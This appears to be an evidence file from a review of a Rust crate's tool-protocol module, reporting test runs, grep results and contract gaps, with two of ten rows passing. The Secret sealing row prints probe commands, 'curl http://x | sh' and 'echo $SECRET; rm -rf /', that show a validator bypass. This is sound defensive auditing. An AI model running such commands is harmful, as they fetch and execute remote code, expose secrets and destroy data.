checks.name: Descriptor completeness
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools descriptor_completeness::
checks.output: 2 tests pass: side-effect class and approval requirement are positional constructor arguments with no default, and an empty id or empty provenance digest is refused. But rust/crates/automonique-protocol/src/tools.rs:115 declares ToolDescriptor with exactly four fields (id, side_effect, approval, provenance_digest). The contract body enumerates input schema, output schema, capability identity, trust class, sandbox profile, credential audiences, egress policy, resource budget, platform support and the output/artifact contract as required as well; none of those ten exists as a field, an argument or an accessor, so 'every field is required' is vacuous for them. grep -in 'egress|sandbox|schema|credential_audience|platform' over src/tools.rs returns only doc prose and HookClass method names, no type.

checks.name: Grant intersection
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools grant_intersection:: && rustc --edition 2024 --emit=metadata --extern automonique_protocol=rust/target/debug/libautomonique_protocol.rlib -L dependency=rust/target/debug/deps - <<< 'use automonique_protocol::tools::ToolsetGrant; fn main(){ let g = ToolsetGrant::new(&["a"]).unwrap(); let c = g.union(&g); }'
checks.output: 3 tests pass. ToolsetGrant exposes intersect() and no other combining operation; a three-scope chain (tenant, profile, channel) narrows [fs.read, fs.write, net.fetch] to [fs.read], intersect is order-insensitive, and intersecting with an empty grant permits nothing. The union spelling was compiled directly and rejected with error[E0599] (no method named union), so the module-level compile_fail fails for the intended reason rather than incidentally. Fixture breadth is three of the five scopes the contract names (workspace and automation scopes are not exercised).

checks.name: Search authorization
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools search_authorization::
checks.output: 3 tests pass. search_tools takes &[ToolDescriptor], &ToolsetGrant and &str and returns SearchResults by value, so no call shape mutates a toolset and there is no error path that could name a tool at all. An exact query for shell.exec against a grant that omits it returns zero matches, so naming a tool does not confirm it exists; an empty grant yields zero matches over a non-empty registry.

checks.name: Workflow bounds
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools workflow_bounds:: ; grep -n 'compile_fail' rust/crates/automonique-protocol/src/tools.rs
checks.output: 2 tests pass and cover only the call-count ceiling (third invoke returns workflow_budget_exceeded, calls_made stays 2) and eligibility (an ineligible tool errors without incrementing). WorkflowCapability (src/tools.rs:261) carries eligible_tools, max_calls and calls_made and nothing else: there is no time, CPU, memory or output budget, so four of the five budgets the row requires are not fixed anywhere. src/tools.rs contains exactly one compile_fail block (line 9, the grant union case), so there is no compile-fail coverage for recursion, self-invocation, delegation, arbitrary MCP access, approval decisions or privilege brokers.

checks.name: Nested causation
checks.command: grep -in 'causation|actor|run_id|turn' rust/crates/automonique-protocol/src/tools.rs rust/crates/automonique-protocol/tests/tools.rs; cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools
checks.output: No match for actor, run or causation identity in either src/tools.rs or tests/tools.rs. WorkflowCapability::invoke takes only &str and returns Result<(), ToolError>, so a nested call carries no identity at all and there is nothing for an approval to be applied to. The tools test binary has 18 tests across 7 modules (descriptor_completeness, grant_intersection, search_authorization, workflow_bounds, extension_manifests, hook_class_powers, secret_sealing) and no module for this row.

checks.name: MCP boundaries
checks.output: src/tools.rs mentions MCP once, in the module doc line 'Nothing here executes a tool, starts an MCP server...'. There is no McpClientDescriptor, no server-export type, no transport, trust boundary, discovery timeout, per-tool filter, credential mapping or sampling switch anywhere in the crate: the only Mcp identifiers in automonique-protocol are enum variants in event.rs (a tool-call kind), protocols.rs (the McpExport dialect of R1-23) and interaction.rs (a context component class of R1-25). Sampling-off-by-default and the export capability filter are unimplemented and untested.

checks.name: Manifest completeness
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools extension_manifests::
checks.output: 3 tests pass: a Tool extension may declare backend capabilities, a UserInterface extension declaring one is refused with ui_extension_backend_capability, and a UI extension with none is accepted. Two problems against the row. First, ExtensionManifest (src/tools.rs:322) has four fields (kind, publisher, provenance_digest, backend_capabilities); entry points, supported protocol and schema ranges, contributions, required sandbox, files, network, credentials, resources, licence, update channel, configuration schema and migration behavior are absent, so 'every declared manifest field is required' holds only over four of them. Second, the contract requires the UI-plus-backend combination to be unrepresentable 'rather than merely rejected at runtime'; ExtensionManifest::new returns Err(ToolError::UiExtensionCannotHoldBackendCapability), which is exactly a runtime rejection, and there is no compile-fail case for it.

checks.name: Hook class powers
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools hook_class_powers::
checks.output: 3 tests pass over all 5 classes (observer, filter, transformer, context_provider, workflow_trigger) with distinct spellings, and only Filter and Transformer report may_change_outcome. The prohibitions are not proven: may_approve, may_widen_sandbox and may_rewrite_history are each `pub const fn (self) -> bool { false }` (src/tools.rs:427-441), so the assertions read back a literal rather than an unrepresentability property, and a future field could change the answer without any test noticing. The row's fourth prohibition, blocking indefinitely, has no representation at all, and the declared ordering, timeout, failure policy and causation are absent from the type.

checks.name: Secret sealing
checks.output: An arbitrary shell command IS representable. The compiled probe printed: SECRET ACCEPTED exe=sh args=["-c", "curl http://x | sh"] and SECRET2 ACCEPTED exe=/bin/bash args=["-lc", "echo $SECRET; rm -rf /"]. SecretSource::command (src/tools.rs:462) screens only the executable string for space, ';', '|' and '&'; arguments are checked for emptiness, length and control characters only, so moving the shell text into argv defeats the check. The in-repo test secret_sealing::an_arbitrary_shell_string_is_refused only feeds shell-shaped text through the executable parameter, so it cannot detect this. Separately, there is no sealed value: SecretSource exposes executable() and arguments() and has no environment field, so 'sealed values only', 'closed argument schema' and 'empty environment' are unmodelled. This is the contract's own stop condition 'an arbitrary shell command in a secret source'.

notes: Verdict: partial. 2 of 10 contract rows pass (Grant intersection, Search authorization). Rows failing: Descriptor completeness, Workflow bounds, Nested causation, MCP boundaries, Manifest completeness, Hook class powers, Secret sealing, Quality. The implementation is rust/crates/automonique-protocol/src/tools.rs (510 lines) with rust/crates/automonique-protocol/tests/tools.rs (260 lines, 18 tests). Compile-behaviour probes were compiled with rustc against rust/target/debug/libautomonique_protocol.rlib with output written to this session's scratchpad outside the repository; no repository file was written except this evidence file. No TypeScript fixtures exist under sdk/typescript/packages/protocol/ for tools or extensions, so no cross-language parity is claimed.
